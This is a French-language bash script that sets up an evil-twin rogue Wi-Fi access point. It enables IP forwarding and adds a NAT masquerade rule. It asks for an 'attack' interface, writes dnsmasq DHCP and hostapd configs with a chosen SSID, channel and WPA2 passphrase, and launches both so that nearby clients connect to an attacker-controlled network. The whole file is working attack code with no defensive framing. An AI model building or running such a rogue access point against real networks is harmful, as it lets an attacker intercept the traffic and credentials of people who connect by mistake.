#!/bin/bash

#mkdir evilTwin
#cd evilTwin
printf "***********************\n"
printf "Systeme en mode router\n"
printf "**********************\n"
echo 1 > /proc/sys/net/ipv4/ip_forward

printf "**********************\n"
printf "Choix de l'interface pour le pare-feu \n"
printf "**********************\n"

PS3="Entrez votre interface pour configurer le pare-feu: "
options=("wlan0" "wlan1" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "wlan0")
            echo "you chose $opt"
            break
	            ;;
        "wlan1")
            echo "you chose $opt"
            break
	          ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

iptables -I POSTROUTING -t nat -o $opt -j MASQUERADE

printf "**********************\n"
printf "Choix de l'interfacesAttack \n"
printf "**********************\n"
PS3="Choisisez votre interface pour attaquer: "
options=("wlan0" "wlan1" "Quit")
select interfacesAttack in "${options[@]}"
do
    case $interfacesAttack in
        "wlan0")
            echo "you chose $interfacesAttack"
            break
	          ;;
        "wlan1")
            echo "you chose $interfacesAttack"
            break
	          ;;
        *) echo "invalid option $REPLY";;
    esac
done

printf "**********************\n"
printf "Creation du fichier dnsmasq.conf\n"
printf "**********************\n"
printf "Veuillez entrez une range d'ip et un timer(x.x.x.x,y.y.y.y,timeh)\n"
read rangeIp

printf "Veuillez entrez une Gateway (x.x.x.x)\n"
read gateway

echo "interface=$interfacesAttack" > dnsmasq.conf
echo "dhcp-range=$rangeIp" >> dnsmasq.conf
echo "dhcp-option=3,$gateway" >> dnsmasq.conf
echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf

printf "**********************\n"
printf "Creation du fichier hostapd.conf\n"
printf "**********************\n"

printf "Veuillez entrez un ssid \n"
read ssid

printf "Veuillez entrez un le mode (g)\n"
read hwMode

printf "Veuillez entrez un channel\n"
read channel

printf "Veuillez entrez le mot de passe que vous souhaitez demandé\n"
read mdp

echo "interface=$interfacesAttack" > hostapd.conf
echo "ssid=$ssid" >> hostapd.conf
echo "hw_mode=$hwMode" >> hostapd.conf
echo "channel=$channel" >> hostapd.conf
echo "wpa=2" >> hostapd.conf
echo "wpa_passphrase=$mdp" >> hostapd.conf
echo "wpa_key_mgmt=WPA-PSK" >> hostapd.conf
echo "wpa_pairwise=TKIP" >> hostapd.conf
echo "rsn_pairwise=CCMP" >> hostapd.conf

printf "**********************\n"
printf "Rendre la gateway fournie accessible\n"
printf "**********************\n"

printf "Veuillez entrez le masque de la gateway\n"
read masque
ip addr add $gateway/$masque dev $interfacesAttack

printf "**********************\n"
printf "Lancement du serveur DHCP et hostapd\n"
printf "**********************\n"

dnsmasq -d -C dnsmasq.conf & hostapd hostapd.conf
